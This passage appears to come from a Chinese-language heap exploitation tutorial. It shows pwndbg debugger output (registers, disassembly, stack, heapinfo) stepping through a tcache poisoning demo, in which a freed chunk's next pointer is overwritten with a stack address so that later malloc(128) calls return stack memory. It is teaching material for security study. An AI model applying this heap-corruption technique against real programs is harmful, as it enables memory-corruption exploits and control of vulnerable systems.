 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x8500000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554872</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">280</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x555555554867</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">269</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555486b</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">273</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555486f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">277</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="no">rdx</span>
 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554872</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">280</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
   <span class="err">0</span><span class="nf">x555555554877</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">285</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">malloc@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554620</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x55555555487c</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">290</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x55555555487f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">293</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007da</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554886</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">300</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2eb</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555488d</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">307</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554890</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">310</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554895</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">315</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">20</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c">;</span>
   <span class="err">24</span> 
 <span class="err">?</span> <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c">;</span>
   <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
   <span class="err">27</span> 
   <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c">;</span>
   <span class="err">29</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">2</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">b</span><span class="p">)</span><span class="c">;</span>
   <span class="err">30</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">got</span> <span class="no">the</span> <span class="no">control</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span> <span class="nf">rdx</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
</pre></div>
此时，第 8 条 tcache 链的 next 已经被改成栈上的地址了。接下来类似 fastbin attack，只需进行两次 <code>malloc(128)</code> 即可控制栈上的空间。</p>
<p>第一次 malloc
<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">1</span><span class="nf">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="mi">0x555555756260</span>
<span class="err">26</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x20</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x7ffff7dd48b0</span> <span class="p">(</span><span class="no">_IO_stdfile_2_lock</span><span class="p">)</span> <span class="err">?—</span> <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x0</span>
 <span class="nf">RSI</span>  <span class="mi">0x7fffffffb900</span> <span class="err">?—</span> <span class="mi">0x6c6c616d20747331</span> <span class="p">(</span><span class="err">&#39;</span><span class="mi">1</span><span class="no">st</span> <span class="no">mall</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x2000000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x55555555489a</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">320</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007bf</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x55555555487f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">293</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007da</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554886</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">300</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2eb</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555488d</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">307</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554890</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">310</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554895</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">315</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x55555555489a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">320</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007bf</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x5555555548a1</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">327</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548a5</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">331</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x234</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548ac</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">338</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548af</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">341</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x5555555548b4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">346</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c">;</span>
 <span class="err">?</span> <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
   <span class="err">27</span> 
   <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c">;</span>
   <span class="err">29</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">2</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">b</span><span class="p">)</span><span class="c">;</span>
   <span class="err">30</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">got</span> <span class="no">the</span> <span class="no">control</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c">;</span>
   <span class="err">31</span> 
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
